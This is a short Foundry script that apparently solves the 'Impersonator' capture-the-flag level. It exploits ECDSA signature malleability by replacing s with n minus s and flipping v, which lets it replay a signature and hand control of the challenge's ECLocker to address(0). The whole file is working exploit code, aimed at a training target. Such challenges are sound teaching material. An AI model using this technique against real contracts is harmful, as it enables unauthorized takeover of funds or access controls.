// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../src/Impersonator.sol";
import {Impersonator} from "../src/Impersonator.sol";
import {Script, console} from "forge-std/Script.sol";

contract ImpersonatorScript is Script {
    function run() public {
        vm.startBroadcast();

        address instanceAddr = 0x77437C54960a6681eA7ccBB65389a2BbE71F1d41;

        Impersonator impersonator = Impersonator(instanceAddr);
        ECLocker locker = impersonator.lockers(0);

        bytes32 r = 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91;
        bytes32 s = 0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2;
        uint8 v = 27;

        uint256 n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
        v = 28;

        locker.changeController(v, r, bytes32(n - uint256(s)), address(0));

        vm.stopBroadcast();
    }
}
